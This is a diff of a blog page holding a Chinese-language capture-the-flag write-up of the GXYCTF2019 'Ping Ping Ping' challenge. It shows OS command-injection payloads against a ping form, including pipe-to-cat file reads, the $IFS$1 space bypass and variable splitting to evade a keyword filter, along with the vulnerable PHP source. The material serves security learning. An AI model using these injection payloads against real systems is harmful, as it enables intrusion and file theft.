@@ -27,18 +27,18 @@
 <meta property="og:site_name" content="Vinson&#39;s Blog">
 <meta property="og:description" content="Ping Ping Ping">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://vinsonx.net/blogimages/GXYCTF2019Ping-Ping-Ping/timu.png">
-<meta property="og:image" content="http://vinsonx.net/blogimages/GXYCTF2019Ping-Ping-Ping/1.png">
-<meta property="og:image" content="http://vinsonx.net/blogimages/GXYCTF2019Ping-Ping-Ping/wenjian.png">
-<meta property="og:image" content="http://vinsonx.net/blogimages/GXYCTF2019Ping-Ping-Ping/guo1.png">
-<meta property="og:image" content="http://vinsonx.net/blogimages/GXYCTF2019Ping-Ping-Ping/guo2.png">
-<meta property="og:image" content="http://vinsonx.net/blogimages/GXYCTF2019Ping-Ping-Ping/index.png">
-<meta property="og:image" content="http://vinsonx.net/blogimages/GXYCTF2019Ping-Ping-Ping/flag.png">
+<meta property="og:image" content="http://vinsonx.net/2022/04/03/GXYCTF2019Ping-Ping-Ping/timu.png">
+<meta property="og:image" content="http://vinsonx.net/2022/04/03/GXYCTF2019Ping-Ping-Ping/1.png">
+<meta property="og:image" content="http://vinsonx.net/2022/04/03/GXYCTF2019Ping-Ping-Ping/wenjian.png">
+<meta property="og:image" content="http://vinsonx.net/2022/04/03/GXYCTF2019Ping-Ping-Ping/guo1.png">
+<meta property="og:image" content="http://vinsonx.net/2022/04/03/GXYCTF2019Ping-Ping-Ping/guo2.png">
+<meta property="og:image" content="http://vinsonx.net/2022/04/03/GXYCTF2019Ping-Ping-Ping/index.png">
+<meta property="og:image" content="http://vinsonx.net/2022/04/03/GXYCTF2019Ping-Ping-Ping/flag.png">
 <meta property="article:published_time" content="2022-04-03T05:02:49.000Z">
-<meta property="article:modified_time" content="2022-05-09T13:35:57.782Z">
+<meta property="article:modified_time" content="2022-05-11T00:29:36.868Z">
 <meta property="article:author" content="Vinson">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://vinsonx.net/blogimages/GXYCTF2019Ping-Ping-Ping/timu.png">
+<meta name="twitter:image" content="http://vinsonx.net/2022/04/03/GXYCTF2019Ping-Ping-Ping/timu.png">
 
 <link rel="canonical" href="http://vinsonx.net/2022/04/03/GXYCTF2019Ping-Ping-Ping/">
 
@@ -228,7 +228,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-05-09 21:35:57" itemprop="dateModified" datetime="2022-05-09T21:35:57+08:00">2022-05-09</time>
+                <time title="Modified: 2022-05-11 08:29:36" itemprop="dateModified" datetime="2022-05-11T08:29:36+08:00">2022-05-11</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -272,21 +272,21 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping "></a>Ping Ping Ping <span id="more"></span></h3><p><strong>打开题目发现只有简单的&#x2F;?ip</strong><br><img src="/./blogimages/GXYCTF2019Ping-Ping-Ping/timu.png" alt="题目"><br><strong>根据题目ping ping ping 猜测要ping ip 然后在url里尝试构造payload</strong></p>
+        <h3 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping "></a>Ping Ping Ping <span id="more"></span></h3><p><strong>打开题目发现只有简单的&#x2F;?ip</strong><br><img src="/2022/04/03/GXYCTF2019Ping-Ping-Ping/timu.png" alt="题目"><br><strong>根据题目ping ping ping 猜测要ping ip 然后在url里尝试构造payload</strong></p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?<span class="attribute">ip</span>=127.0.0.1</span><br></pre></td></tr></table></figure>
-<p><img src="/./blogimages/GXYCTF2019Ping-Ping-Ping/1.png" alt="回显1"><br><strong>提示有回显 我们构造一下payload让他列出文件</strong></p>
+<p><img src="/2022/04/03/GXYCTF2019Ping-Ping-Ping/1.png" alt="回显1"><br><strong>提示有回显 我们构造一下payload让他列出文件</strong></p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?<span class="attribute">ip</span>=127.0.0.1|ls</span><br></pre></td></tr></table></figure>
-<p><img src="/./blogimages/GXYCTF2019Ping-Ping-Ping/wenjian.png" alt="文件"><br><strong>发现有两个php文件，Flag大概率在flag.php文件内 所以我们列出文件内容</strong></p>
+<p><img src="/2022/04/03/GXYCTF2019Ping-Ping-Ping/wenjian.png" alt="文件"><br><strong>发现有两个php文件，Flag大概率在flag.php文件内 所以我们列出文件内容</strong></p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?<span class="attribute">ip</span>=127.0.0.1|cat flag.php</span><br></pre></td></tr></table></figure>
-<p><img src="/./blogimages/GXYCTF2019Ping-Ping-Ping/guo1.png" alt="过滤1"><br><strong>发现空格被过滤了</strong><br><strong>空格绕过$IFS$1 然后我们在构造一下payload</strong></p>
+<p><img src="/2022/04/03/GXYCTF2019Ping-Ping-Ping/guo1.png" alt="过滤1"><br><strong>发现空格被过滤了</strong><br><strong>空格绕过$IFS$1 然后我们在构造一下payload</strong></p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=<span class="number">127.0</span>.<span class="number">0.1</span>|<span class="built_in">cat</span><span class="variable">$IFS</span><span class="variable">$1flag</span>.php</span><br></pre></td></tr></table></figure>
-<p><img src="/./blogimages/GXYCTF2019Ping-Ping-Ping/guo2.png" alt="过滤2"><br><strong>发现还有东西被过滤了我们在去看一下另一个index.php文件，有些文字被注释掉了，所以我们直接查看源码</strong></p>
+<p><img src="/2022/04/03/GXYCTF2019Ping-Ping-Ping/guo2.png" alt="过滤2"><br><strong>发现还有东西被过滤了我们在去看一下另一个index.php文件，有些文字被注释掉了，所以我们直接查看源码</strong></p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=<span class="number">127.0</span>.<span class="number">0.1</span>|<span class="built_in">cat</span><span class="variable">$IFS</span><span class="variable">$1index</span>.php</span><br></pre></td></tr></table></figure>
-<p><img src="/./blogimages/GXYCTF2019Ping-Ping-Ping/index.png" alt="index"></p>
+<p><img src="/2022/04/03/GXYCTF2019Ping-Ping-Ping/index.png" alt="index"></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">&lt;pre&gt;/?ip=</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p><strong>发现过滤了很多东西 常规的访问flag.php的方法是不行的 发现代码内有$a 可以进行变量覆盖 然后我们构造payload</strong></p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=<span class="number">127.0</span>.<span class="number">0.1</span>;a=g;<span class="built_in">cat</span><span class="variable">$IFS</span><span class="variable">$1fla</span><span class="variable">$a</span>.php</span><br></pre></td></tr></table></figure>
-<p><strong>回显后是空白页面是因为出题人把flag注释了，所以我们直接查看源码就可以获取到flag</strong><br><img src="/./blogimages/GXYCTF2019Ping-Ping-Ping/flag.png" alt="flag"></p>
+<p><strong>回显后是空白页面是因为出题人把flag注释了，所以我们直接查看源码就可以获取到flag</strong><br><img src="/2022/04/03/GXYCTF2019Ping-Ping-Ping/flag.png" alt="flag"></p>
 
     </div>
 
